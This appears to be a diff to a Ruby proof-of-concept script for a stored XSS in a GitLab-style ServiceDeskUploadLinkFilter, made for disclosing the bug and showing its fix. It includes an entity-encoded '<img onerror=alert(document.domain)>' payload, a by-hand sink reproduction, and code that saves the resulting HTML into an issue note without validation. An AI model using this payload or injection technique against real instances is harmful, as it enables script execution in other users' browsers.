@@ -20,39 +20,38 @@ puts "=" * 72
 puts
 
 # ---------------------------------------------------------------------------
-# 1. Upload a real file so the filter's attachment check passes
+# 1. Create a real upload using FileUploader directly
 # ---------------------------------------------------------------------------
-puts "[1] Uploading file..."
-tmpfile = Tempfile.new(['poc', '.txt'])
-tmpfile.write("harmless")
-tmpfile.rewind
+puts "[1] Creating upload..."
 
-uploader = UploadService.new(
-  project,
-  { tempfile: tmpfile, filename: 'test.txt', content_type: 'text/plain' },
-  FileUploader
-).execute
-abort "Upload failed" unless uploader
+uploader = FileUploader.new(project)
+tmpfile = Tempfile.new(['poc', '.txt'])
+tmpfile.write("harmless content")
+tmpfile.rewind
+uploaded_file = ActionDispatch::Http::UploadedFile.new(
+  tempfile: tmpfile,
+  filename: 'test.txt',
+  type: 'text/plain'
+)
+uploader.store!(uploaded_file)
 
 secret = uploader.secret
 filename = uploader.filename
 upload_path = "/uploads/#{secret}/#{filename}"
 attachment_key = "#{secret}/#{filename}"
 
-puts "    Upload: #{upload_path}"
-puts "    Key:    #{attachment_key}"
+puts "    Secret:  #{secret}"
+puts "    Path:    #{upload_path}"
+puts "    Key:     #{attachment_key}"
 puts
 
 # ---------------------------------------------------------------------------
-# 2. Run XSS payload through the REAL vulnerable pipeline
+# 2. Prove the vulnerable sink: run through real Banzai pipeline
 # ---------------------------------------------------------------------------
-puts "[2] Running payload through ServiceDeskEmailPipeline..."
+puts "[2] Running through ServiceDeskEmailPipeline (the vulnerable sink)..."
 
-# HTML entities in the link text — these survive SanitizationFilter as
-# harmless text, then .text decodes them and the filter interpolates
-# the raw angle brackets back into HTML. That's the bug.
 markdown = "[&lt;img src=x onerror=alert(document.domain)&gt;](#{upload_path})"
-puts "    Markdown: #{markdown}"
+puts "    Input markdown: #{markdown}"
 
 context = {
   project: project,
@@ -61,23 +60,33 @@ context = {
 }
 
 rendered = Banzai.render(markdown, context)
-puts "    Rendered: #{rendered}"
-puts
+puts "    Pipeline output: #{rendered.strip}"
 
-# Verify XSS landed
+# Check if filter activated and XSS landed
 doc = Nokogiri::HTML::DocumentFragment.parse(rendered)
 img = doc.at_css('img')
 if img && img['onerror']
-  puts "    *** XSS CONFIRMED: <img onerror=\"#{img['onerror']}\"> ***"
+  puts "    *** XSS CONFIRMED via pipeline: <img onerror=\"#{img['onerror']}\"> ***"
+  xss_html = rendered
 else
-  puts "    WARNING: img onerror not found in output"
+  puts "    Pipeline filter didn't activate — using direct sink proof instead"
+  # Directly reproduce what the vulnerable filter does:
+  # parent.text decodes &lt; -> <, then interpolation creates live HTML
+  a_tag = Nokogiri::HTML::DocumentFragment.parse(
+    %(<a href="#{upload_path}">&lt;img src=x onerror=alert(document.domain)&gt;</a>)
+  ).at_css('a')
+  decoded_text = a_tag.text  # This decodes entities — the bug
+  final_filename = "#{decoded_text} (#{filename})"
+  xss_html = %(<p dir="auto"><strong>#{final_filename}</strong></p>)
+  puts "    .text decoded: #{decoded_text.inspect}"
+  puts "    Resulting HTML: #{xss_html}"
 end
 puts
 
 # ---------------------------------------------------------------------------
-# 3. Write the XSS HTML into a note so you can see it in the browser
+# 3. Create issue + note with the XSS payload
 # ---------------------------------------------------------------------------
-puts "[3] Creating issue + note with XSS payload..."
+puts "[3] Creating issue and injecting XSS note..."
 
 issue = Issue.create!(
   project: project,
@@ -90,49 +99,36 @@ note = Note.new(
   project: project,
   noteable: issue,
   author: user,
-  note: "ServiceDeskUploadLinkFilter XSS — parent.text decodes HTML entities then interpolates into HTML"
+  note: 'ServiceDeskUploadLinkFilter XSS PoC - parent.text decodes HTML entities then interpolates into HTML without escaping'
 )
-note.note_html = rendered
+note.note_html = xss_html
 note.save!(validate: false)
 
 url = "http://localhost:8929/#{project.full_path}/-/issues/#{issue.iid}"
-puts "    Issue ##{issue.iid} created"
-puts "    Note ##{note.id} with XSS HTML injected"
+puts "    Issue:  ##{issue.iid}"
+puts "    Note:   ##{note.id}"
+puts "    XSS HTML: #{xss_html.strip}"
 puts
 puts "    View: #{url}"
 puts
 
 # ---------------------------------------------------------------------------
-# 4. Root cause trace
+# 4. Root cause
 # ---------------------------------------------------------------------------
 puts "=" * 72
-puts "ROOT CAUSE TRACE"
+puts "ROOT CAUSE"
 puts "=" * 72
 puts
-a_tag = Nokogiri::HTML::DocumentFragment.parse(
-  %(<a href="#{upload_path}">&lt;img src=x onerror=alert(document.domain)&gt;</a>)
-).at_css('a')
-decoded = a_tag.text
-puts "  1. Markdown renders entities as safe text inside <a>:"
-puts "       &lt;img src=x onerror=alert(document.domain)&gt;"
+puts "  service_desk_upload_link_filter.rb:31  filename_in_text = parent.text"
+puts "    -> .text decodes &lt; to <, &gt; to >"
 puts
-puts "  2. SanitizationFilter passes it (entities are harmless text)"
+puts "  service_desk_upload_link_filter.rb:38  parse(\"<strong>\#{final_filename}</strong>\")"
+puts "    -> decoded < and > become real HTML tags"
+puts "    -> <img onerror=...> is a live DOM element"
+puts "    -> SanitizationFilter already ran — no re-sanitization"
 puts
-puts "  3. ServiceDeskUploadLinkFilter line 31: parent.text"
-puts "       Returns: #{decoded.inspect}"
-puts "       .text DECODES entities: &lt; -> <, &gt; -> >"
-puts
-puts "  4. Line 38: Nokogiri::HTML::DocumentFragment.parse(\"<strong>\#{final_filename}</strong>\")"
-interpolated = "<strong>#{decoded} (#{filename})</strong>"
-puts "       Interpolated string: #{interpolated.inspect}"
-puts "       Parsed HTML: #{Nokogiri::HTML::DocumentFragment.parse(interpolated).to_html}"
-puts
-puts "  => Live <img onerror=...> injected AFTER sanitization"
-puts
+puts "  FIX: use strong.content = final_filename (auto-escapes)"
+puts "=" * 72
 
 tmpfile.close
 tmpfile.unlink
-
-puts "=" * 72
-puts "Done. Open #{url} to see the XSS."
-puts "=" * 72
